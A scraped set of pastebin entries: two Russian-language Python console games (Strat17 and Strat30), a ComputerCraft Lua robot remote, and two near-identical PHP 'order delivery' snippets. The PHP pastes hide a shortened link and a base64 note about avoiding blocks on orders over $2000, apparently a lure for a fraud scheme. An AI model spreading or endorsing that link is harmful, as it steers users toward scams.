            if not self.points[i].is_colored():
                # Проверяем, есть ли окрашенные соседние точки
                left_neighbor = (i - 1) % self.num_points
                right_neighbor = (i + 1) % self.num_points
                
                if self.points[left_neighbor].is_colored() or self.points[right_neighbor].is_colored():
                    available_moves.append(i)
        
        return available_moves
    
    def make_move(self, point_index, color):
        """"""Выполняет ход - окрашивает выбранную точку в указанный цвет""""""
        if point_index not in self.get_available_moves():
            return False, ""Недопустимый ход!""
        
        self.points[point_index].set_color(color)
        self.last_colored_points.append(point_index)
        
        # Меняем текущего игрока
        self.current_player = ""Вася"" if self.current_player == ""Петя"" else ""Петя""
        
        return True, f""Точка {point_index} окрашена в {color} цвет""
    
    def check_equilateral_triangles(self):
        """"""Проверяет наличие равносторонних треугольников одного цвета""""""
        # В окружности с 9 равноотстоящими точками равносторонний треугольник 
        # образуют точки, индексы которых отличаются на 3
        # (например, 0, 3, 6 или 1, 4, 7 или 2, 5, 8)
        triangles = []
        
        for start in range(3):
            points_indices = [start, (start + 3) % 9, (start + 6) % 9]
            colors = [self.points[i].color for i in points_indices]
            
            # Проверяем, что все точки окрашены и имеют один цвет
            if colors[0] is not None and colors[0] == colors[1] == colors[2]:
                triangles.append((points_indices, colors[0]))
        
        return triangles
    
    def is_game_over(self):
        """"""Проверяет, закончилась ли игра""""""
        # Игра заканчивается, когда все точки окрашены
        if not all(point.is_colored() for point in self.points):
            return False, None
        
        # Проверяем наличие равносторонних треугольников одного цвета
        triangles = self.check_equilateral_triangles()
        
        if triangles:
            # Вася выигрывает, если есть равносторонний треугольник одного цвета
            return True, ""Вася""
        else:
            # Петя выигрывает, если нет равностороннего треугольника одного цвета
            return True, ""Петя""
    
    def computer_move(self):
        """"""Реализует ход компьютера""""""
        available_moves = self.get_available_moves()
        if not available_moves:
            return False, ""Нет доступных ходов""
        
        # Проверяем, является ли компьютер Петей или Васей
        is_computer_petya = self.current_player == ""Петя""
        
        # Простая стратегия для компьютера
        best_move = None
        best_color = None
        
        # Перебираем все возможные ходы и цвета
        for point_index in available_moves:
            for color in ['red', 'blue']:
                # Временно делаем ход
                self.points[point_index].set_color(color)
                
                # Проверяем наличие треугольников
                triangles = self.check_equilateral_triangles()
                
                # Если компьютер играет за Васю и может выиграть
                if not is_computer_petya and triangles:
                    best_move = point_index
                    best_color = color
                    self.points[point_index].color = None  # Отменяем временный ход
                    break
                
                # Если компьютер играет за Петю и может предотвратить победу Васи
                if is_computer_petya:
                    # Проверяем, может ли следующий ход Васи привести к победе
                    will_vasya_win = False
                    temp_current_player = self.current_player
                    self.current_player = ""Вася"" if self.current_player == ""Петя"" else ""Петя""
                    
                    next_available_moves = self.get_available_moves()
                    for next_move in next_available_moves:
                        for next_color in ['red', 'blue']:
                            self.points[next_move].set_color(next_color)
                            if self.check_equilateral_triangles():
                                will_vasya_win = True
                            self.points[next_move].color = None
                            if will_vasya_win:
                                break
                        if will_vasya_win:
                            break
                    
                    self.current_player = temp_current_player
                    
                    if not will_vasya_win and (best_move is None or random.random() < 0.3):
                        best_move = point_index
                        best_color = color
                
                # Отменяем временный ход
                self.points[point_index].color = None
        
        # Если нет хорошего хода, выбираем случайный
        if best_move is None:
            best_move = random.choice(available_moves)
            best_color = random.choice(['red', 'blue'])
        
        # Делаем ход
        success, message = self.make_move(best_move, best_color)
        return success, f""Компьютер ({self.current_player if not success else ('Петя' if self.current_player == 'Вася' else 'Вася')}): {message}""

    def display_board(self):
        """"""Отображает текущее состояние игрового поля""""""
        print(""\nСостояние игры:"")
        print(""  "", end="""")
        for i in range(self.num_points):
            if self.points[i].color == 'red':
                print(""R"", end="" "")
            elif self.points[i].color == 'blue':
                print(""B"", end="" "")
            else:
                print(""○"", end="" "")
        print(""\n  "", end="""")
        for i in range(self.num_points):
            print(i, end="" "")
        print(""\n"")
        
        # Показываем последний ход
        if self.last_colored_points:
            last_point = self.last_colored_points[-1]
            print(f""Последний ход: точка {last_point} окрашена в {self.points[last_point].color}"")
        
        # Показываем текущего игрока
        print(f""Сейчас ходит: {self.current_player}"")
        
        # Показываем доступные ходы
        available_moves = self.get_available_moves()
        if available_moves:
            print(f""Доступные ходы: {available_moves}"")

def play_game():
    """"""Функция для запуска игры с пользовательским вводом""""""
    print(""Добро пожаловать в игру Strat17!"")
    print(""Правила:"")
    print(""- На окружности отмечено 9 точек, делящих окружность на 9 равных дуг"")
    print(""- Петя и Вася по очереди окрашивают точки в красный (R) или синий (B) цвет"")
    print(""- Первым ходит Петя, который может окрасить любую точку"")
    print(""- Далее можно окрашивать только неокрашенные точки, соседние с уже окрашенными"")
    print(""- Вася выигрывает, если после окрашивания всех точек найдётся равносторонний"")
    print(""  треугольник, все вершины которого окрашены в один цвет"")
    print(""- В окружности с 9 точками равносторонними треугольниками являются наборы точек:"")
    print(""  (0,3,6), (1,4,7), (2,5,8)"")
    
    game_mode = input(""\nВыберите режим игры:\n1. Против компьютера (вы - Петя)\n2. Против компьютера (вы - Вася)\n3. Два игрока\nВыбор: "")
    
    player_vs_computer = True
    player_is_petya = True
    
    if game_mode == ""1"":
        player_vs_computer = True
        player_is_petya = True
    elif game_mode == ""2"":
        player_vs_computer = True
        player_is_petya = False
    elif game_mode == ""3"":
        player_vs_computer = False
    else:
        print(""Неверный выбор. Выбран режим против компьютера (вы - Петя)"")
    
    game = Game(player_vs_computer=player_vs_computer)
    
    while True:
        game.display_board()
        
        game_over, winner = game.is_game_over()
        if game_over:
            print(f""\nИгра окончена! Победитель: {winner}"")
            triangles = game.check_equilateral_triangles()
            if triangles:
                for triangle, color in triangles:
                    print(f""Треугольник с вершинами {triangle} окрашен в {color} цвет"")
            break
        
        # Определяем, кто сейчас ходит - компьютер или игрок
        computer_turn = (player_vs_computer and 
                        ((game.current_player == ""Петя"" and not player_is_petya) or 
                        (game.current_player == ""Вася"" and player_is_petya)))
        
        if computer_turn:
            print(""Компьютер думает..."")
            time.sleep(1)  # Небольшая задержка для эффекта ""размышления""
            success, message = game.computer_move()
            print(message)
        else:
            # Ход игрока
            available_moves = game.get_available_moves()
            if not available_moves:
                print(""Нет доступных ходов!"")
                break
            
            try:
                point_index = int(input(f""{game.current_player}, выберите точку для окрашивания {available_moves}: ""))
                if point_index not in available_moves:
                    print(""Недопустимый ход! Попробуйте снова."")
                    continue
                
                color = input(""Выберите цвет (r - красный, b - синий): "").lower()
                if color == 'r':
                    color = 'red'
                elif color == 'b':
                    color = 'blue'
                else:
                    print(""Неверный цвет! Используйте 'r' для красного или 'b' для синего."")
                    continue
                
                success, message = game.make_move(point_index, color)
                if not success:
                    print(message)
            except ValueError:
                print(""Пожалуйста, введите корректное число!"")

if __name__ == ""__main__"":
    play_game()"
8r8QbGLw,Untitled,Hasli4,Python,Friday 21st of March 2025 02:08:00 AM CDT,"import random
import time
import math
from typing import List, Tuple

class Player:
    """"""
    Базовый класс игрока
    """"""
    def __init__(self, name: str):
        self.name = name
    
    def make_move(self, current_number: int, target_number: int) -> int:
        """"""
        Метод, который должен быть переопределен в подклассах
        для реализации стратегии игрока
        """"""
        pass


class HumanPlayer(Player):
    """"""
    Класс, представляющий игрока-человека
    """"""
    def make_move(self, current_number: int, target_number: int) -> int:
        # Получаем все возможные ходы
        possible_moves = self._get_possible_moves(current_number)
        
        # Выводим информацию о текущем состоянии игры
        print(f""\nТекущее число на доске: {current_number}"")
        print(f""Цель: достигнуть {target_number} или больше"")
        print(f""Возможные ходы: {', '.join(str(move) for move in possible_moves)}"")
        
        # Запрашиваем ход у пользователя
        while True:
            try:
                choice = int(input(f""{self.name}, выберите новое число: ""))
                if choice in possible_moves:
                    return choice
                else:
                    print(""Недопустимый ход! Выберите число из списка возможных ходов."")
            except ValueError:
                print(""Введите корректное число!"")
    
    def _get_possible_moves(self, current_number: int) -> List[int]:
        """"""
        Вычисляет все возможные ходы для текущего числа на доске
        """"""
        moves = []
        # Находим все делители текущего числа
        for i in range(1, current_number + 1):
            if current_number % i == 0:
                moves.append(current_number + i)
        return moves


class ComputerPlayer(Player):
    """"""
    Класс, представляющий компьютерного игрока
    """"""
    def __init__(self, name: str, difficulty: str = ""medium""):
        super().__init__(name)
        self.difficulty = difficulty  # Уровень сложности: ""easy"", ""medium"", ""hard""
    
    def make_move(self, current_number: int, target_number: int) -> int:
        # Получаем все возможные ходы
        possible_moves = self._get_possible_moves(current_number)
        
        print(f""\n{self.name} думает..."")
        time.sleep(1)  # Добавляем задержку для имитации ""размышления""
        
        # В зависимости от уровня сложности выбираем стратегию
        if self.difficulty == ""easy"":
            # Простой уровень: выбор случайного хода
            choice = random.choice(possible_moves)
        elif self.difficulty == ""medium"":
            # Средний уровень: выбор между случайным и оптимальным ходом
            if random.random() < 0.5:
                choice = self._get_best_move(current_number, possible_moves, target_number)
            else:
                choice = random.choice(possible_moves)
        else:  # hard
            # Сложный уровень: всегда выбирает наилучший ход
            choice = self._get_best_move(current_number, possible_moves, target_number)
        
        print(f""{self.name} выбирает число: {choice}"")
        return choice
    
    def _get_possible_moves(self, current_number: int) -> List[int]:
        """"""
        Вычисляет все возможные ходы для текущего числа на доске
        """"""
        moves = []
        # Находим все делители текущего числа
        for i in range(1, current_number + 1):
            if current_number % i == 0:
                moves.append(current_number + i)
        return moves
    
    def _get_best_move(self, current_number: int, possible_moves: List[int], target_number: int) -> int:
        """"""
        Определяет наилучший ход с использованием стратегии
        """"""
        # Если можем выиграть - выигрываем
        winning_moves = [move for move in possible_moves if move >= target_number]
        if winning_moves:
            return min(winning_moves)  # Выбираем наименьшее выигрышное число
        
        # Ищем выигрышные позиции для нас
        for move in possible_moves:
            if self._is_winning_position(move, target_number):
                return move
        
        # Если нет выигрышной стратегии, выбираем ход, дающий максимальное число
        return max(possible_moves)
    
    def _is_winning_position(self, position: int, target_number: int) -> bool:
        """"""
        Определяет, является ли позиция выигрышной с помощью анализа игры
        """"""
        # Если позиция уже достигла или превысила целевое число - это выигрыш
        if position >= target_number:
            return True
        
        # Находим все возможные ходы противника из этой позиции
        opponent_moves = []
        for i in range(1, position + 1):
            if position % i == 0:
                opponent_moves.append(position + i)
        
        # Если хотя бы один ход противника ведёт к проигрышной для нас позиции,
        # то текущая позиция не является выигрышной
        for opponent_move in opponent_moves:
            if not self._can_win_from_position(opponent_move, target_number):
                return False
        
        # Если все ходы противника ведут к выигрышной для нас позиции,
        # то текущая позиция является выигрышной
        return True
    
    def _can_win_from_position(self, position: int, target_number: int) -> bool:
        """"""
        Проверяет, можно ли выиграть из данной позиции
        Это упрощенная проверка для ограничения глубины анализа
        """"""
        # Если позиция уже достигла или превысила целевое число - это выигрыш
        if position >= target_number:
            return True
        
        # Рассматриваем только простые случаи для ограничения вычислительной сложности
        # Проверяем, есть ли делитель, который позволит достичь целевое число за один ход
        for i in range(1, position + 1):
            if position % i == 0 and position + i >= target_number:
                return True
        
        return False


class Game:
    """"""
    Класс, представляющий игру Strat30
    """"""
    def __init__(self, start_number: int = 10, target_number: int = 60):
        self.start_number = start_number
        self.target_number = target_number
        self.current_number = start_number
        self.players = []
        self.current_player_index = 0
    
    def add_player(self, player: Player):
        """"""
        Добавляет игрока в игру
        """"""
        self.players.append(player)
    
    def start_game(self):
        """"""
        Запускает игру
        """"""
        print(f""\n=== Начало игры Strat30 ==="")
        print(f""Начальное число: {self.start_number}"")
        print(f""Цель: достигнуть {self.target_number} или больше"")
        print(f""Игроки: {', '.join(player.name for player in self.players)}"")
        
        # Основной игровой цикл
        while True:
            current_player = self.players[self.current_player_index]
            
            # Игрок делает ход
            new_number = current_player.make_move(self.current_number, self.target_number)
            
            # Обновляем число на доске
            self.current_number = new_number
            
            # Проверяем условие победы
            if self.current_number >= self.target_number:
                print(f""\n=== {current_player.name} победил! ==="")
                print(f""Финальное число на доске: {self.current_number}"")
                break
            
            # Переходим к следующему игроку
            self.current_player_index = (self.current_player_index + 1) % len(self.players)


def get_game_setup() -> Tuple[int, int, list]:
    """"""
    Функция для настройки параметров игры через консольный интерфейс
    """"""
    print(""\n=== Настройка игры Strat30 ==="")
    
    # Запрашиваем начальное число
    while True:
        try:
            start_number = int(input(""Введите начальное число n (рекомендуется 10-30): ""))
            if start_number > 0:
                break
            else:
                print(""Число должно быть положительным!"")
        except ValueError:
            print(""Введите корректное число!"")
    
    # Запрашиваем целевое число
    while True:
        try:
            target_number = int(input(f""Введите целевое число (рекомендуется не менее {start_number*2}): ""))
            if target_number > start_number:
                break
            else:
                print(f""Целевое число должно быть больше начального ({start_number})!"")
        except ValueError:
            print(""Введите корректное число!"")
    
    # Создаем список игроков
    players = []
    
    # Запрашиваем количество человек-игроков
    while True:
        try:
            num_human_players = int(input(""Введите количество человек-игроков (0-4): ""))
            if 0 <= num_human_players <= 4:
                break
            else:
                print(""Количество должно быть от 0 до 4!"")
        except ValueError:
            print(""Введите корректное число!"")
    
    # Создаем человек-игроков
    for i in range(num_human_players):
        name = input(f""Введите имя игрока {i+1}: "")
        if not name:
            name = f""Игрок {i+1}""
        players.append(HumanPlayer(name))
    
    # Запрашиваем количество компьютерных игроков
    while True:
        try:
            num_computer_players = int(input(""Введите количество компьютерных игроков (0-4): ""))
            if 0 <= num_computer_players <= 4 and (num_human_players + num_computer_players) > 0:
                break
            else:
                print(""Количество должно быть от 0 до 4 и общее количество игроков должно быть не менее 1!"")
        except ValueError:
            print(""Введите корректное число!"")
    
    # Создаем компьютерных игроков
    for i in range(num_computer_players):
        # Запрашиваем уровень сложности для каждого компьютерного игрока
        while True:
            difficulty = input(f""Выберите уровень сложности для Компьютер {i+1} (easy/medium/hard): "").lower()
            if difficulty in [""easy"", ""medium"", ""hard""]:
                break
            else:
                print(""Неверный уровень сложности! Выберите один из: easy, medium, hard"")
        
        players.append(ComputerPlayer(f""Компьютер {i+1}"", difficulty))
    
    # Перемешиваем порядок игроков для случайного первого хода
    random.shuffle(players)
    
    return start_number, target_number, players


def main():
    """"""
    Основная функция для запуска игры
    """"""
    print(""Добро пожаловать в игру Strat30!"")
    print(""Правила игры:"")
    print(""1. Изначально на доске написано число n."")
    print(""2. Игрок в свой ход может прибавить к числу на доске любой его натуральный делитель, стереть старое число и записать новое."")
    print(""3. Побеждает тот, кто получит после своего хода число, не меньшее заданного целевого числа."")
    
    # Настраиваем игру
    start_number, target_number, players = get_game_setup()
    
    # Создаем и настраиваем игру
    game = Game(start_number, target_number)
    for player in players:
        game.add_player(player)
    
    # Запускаем игру
    game.start_game()
    
    # Спрашиваем о новой игре
    while True:
        play_again = input(""\nХотите сыграть еще раз? (да/нет): "").lower()
        if play_again in [""да"", ""yes"", ""y"", ""д""]:
            # Настраиваем и запускаем новую игру
            start_number, target_number, players = get_game_setup()
            game = Game(start_number, target_number)
            for player in players:
                game.add_player(player)
            game.start_game()
        elif play_again in [""нет"", ""no"", ""n"", ""н""]:
            print(""Спасибо за игру! До свидания!"")
            break
        else:
            print(""Пожалуйста, введите 'да' или 'нет'."")


if __name__ == ""__main__"":
    main()"
3iGZK83i,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 02:02:21 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""739"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
hx8Tnnf5,Untitled,josemanuelaparicio,PHP,Friday 21st of March 2025 01:56:36 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""957"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
5wY1BLjM,Handheld Remote Control Program,Friendsincode,Lua,Friday 21st of March 2025 01:52:30 AM CDT,"--------------------------------------------------------------------------------
-- Wireless Robot Control Program (Handheld)
--
-- This program runs on your handheld remote computer and does the following:
--
-- 1. Listens for robots to “check in” via rednet.
--    - A robot should send a message formatted as: ""checkin:<name>""
--      (If no name is provided, the robot’s ID will be used.)
--
-- 2. Displays a clickable main list of all checked–in robots (with name and ID).
--
-- 3. When you click a robot from the list, a submenu appears with these options:
--    - Stats       (sends a ""stats"" command and waits for the robot's reply)
--    - Start       (sends a ""start"" command)
--    - Stop        (sends a ""stop"" command)
--    - Return Home (sends a ""home"" command)
--
-- Press “r” on your keyboard at any time to refresh the robot list.
--
-- ASSUMPTIONS:
--  - A modem is attached on the specified side (""back"" by default).
--  - Robots send check–in messages formatted as ""checkin:<name>"".
--  - Robots are programmed to handle the commands: ""stats"", ""start"", ""stop"", and ""home"".
--------------------------------------------------------------------------------

-- Open rednet on the modem on the specified side.
local modemSide = ""back""
if not rednet.isOpen(modemSide) then
  rednet.open(modemSide)
end

-- Table to store robot info; key = robot ID, value = {name = <name>, lastCheckin = <time>}
local robots = {}

--------------------------------------------------------------------------------
-- FUNCTION: handleRednetMessages
-- Listens for incoming rednet messages and updates the robots table.
--------------------------------------------------------------------------------
local function handleRednetMessages()
  while true do
    local sender, message, protocol = rednet.receive()
    if type(message) == ""string"" then
      -- Expecting checkin messages in the format: ""checkin:<name>""
      local cmd, data = message:match(""^(%w+):?(.*)"")
      if cmd == ""checkin"" then
        local name = (data ~= """" and data) or (""Robot "" .. sender)
        robots[sender] = { name = name, lastCheckin = os.time() }
        print(""Robot checked in: "" .. sender .. "" ("" .. name .. "")"")
      end
    end
  end
end

--------------------------------------------------------------------------------
-- FUNCTION: displayMainList
-- Clears the terminal and prints the main list of checked–in robots.
-- Returns a table mapping list line numbers to robot IDs.
--------------------------------------------------------------------------------
local function displayMainList()
  term.clear()
  term.setCursorPos(1,1)
  print(""Robot Control Main List"")
  print(""======================="")
  local i = 1
  local lines = {} -- mapping: list number -> robot ID
  for id, info in pairs(robots) do
    local line = string.format(""%d) %s (ID: %d)"", i, info.name, id)
    print(line)
    lines[i] = id
    i = i + 1
  end
  print("""")
  print(""Click a robot to view options. Press 'r' to refresh."")
  return lines
end

--------------------------------------------------------------------------------
-- FUNCTION: displayRobotMenu
-- Shows the options menu for the given robot.
--------------------------------------------------------------------------------
local function displayRobotMenu(robotId)
  term.clear()
  term.setCursorPos(1,1)
  local robot = robots[robotId]
  print(""Robot: "" .. robot.name .. "" (ID: "" .. robotId .. "")"")
  print(""======================="")
  print(""1) Stats"")
  print(""2) Start"")
  print(""3) Stop"")
  print(""4) Return Home"")
  print("""")
  print(""Click an option number or press 'b' to go back."")
end

--------------------------------------------------------------------------------
-- FUNCTION: sendCommand
-- Sends a command to the specified robot via rednet.
--------------------------------------------------------------------------------
local function sendCommand(robotId, command)
  rednet.send(robotId, command)
  print(""Sent command '"" .. command .. ""' to robot "" .. robotId)
end

--------------------------------------------------------------------------------
-- FUNCTION: main
-- Main UI loop that displays the list and processes user clicks.
--------------------------------------------------------------------------------
local function main()
  local mainListLines = displayMainList()
  while true do
    local event, p1, p2, p3 = os.pullEvent()
    if event == ""mouse_click"" then
      local button, x, y = p1, p2, p3
      -- Assume the robot list starts on line 3.
      if y >= 3 and y < 3 + #mainListLines then
        local index = y - 2  -- line 3 corresponds to index 1, etc.
        local selectedRobotId = mainListLines[index]
        if selectedRobotId then
          -- Show the submenu for the selected robot.
          displayRobotMenu(selectedRobotId)
          local chosen = false
          while not chosen do
            local event2, a, b, c = os.pullEvent()
            if event2 == ""mouse_click"" then
              local _, optX, optY = a, b, c
              -- Options assumed to be on lines 3-6 in the robot menu.
              if optY >= 3 and optY <= 6 then
                local option = optY - 2
                if option == 1 then
                  sendCommand(selectedRobotId, ""stats"")
                  -- Wait for a reply from the robot (up to 5 seconds).
                  local sender, reply, protocol = rednet.receive(nil, 5)
                  if sender == selectedRobotId then
                    print(""Stats from robot "" .. selectedRobotId .. "": "" .. reply)
                  else
                    print(""No stats received from robot "" .. selectedRobotId)
                  end
                  print(""Press any key or click to go back."")
                  os.pullEvent()  -- Wait for any event.
                elseif option == 2 then
                  sendCommand(selectedRobotId, ""start"")
                elseif option == 3 then
                  sendCommand(selectedRobotId, ""stop"")
                elseif option == 4 then
                  sendCommand(selectedRobotId, ""home"")
                end
                chosen = true
              end
            elseif event2 == ""key"" then
              local key = a
              if key == keys.b then
                chosen = true
              end
            end
          end
          mainListLines = displayMainList()
        end
      end
    elseif event == ""key"" then
      local key = p1
      -- Refresh the main list if 'r' is pressed.
      if key == keys.r then
        mainListLines = displayMainList()
      end
    end
  end
end

--------------------------------------------------------------------------------
-- MAIN: Run both the rednet listener and the UI in parallel.
--------------------------------------------------------------------------------
parallel.waitForAny(main, handleRednetMessages)

-- Close rednet when done.
if rednet.isOpen(modemSide) then
  rednet.close(modemSide)
end
"
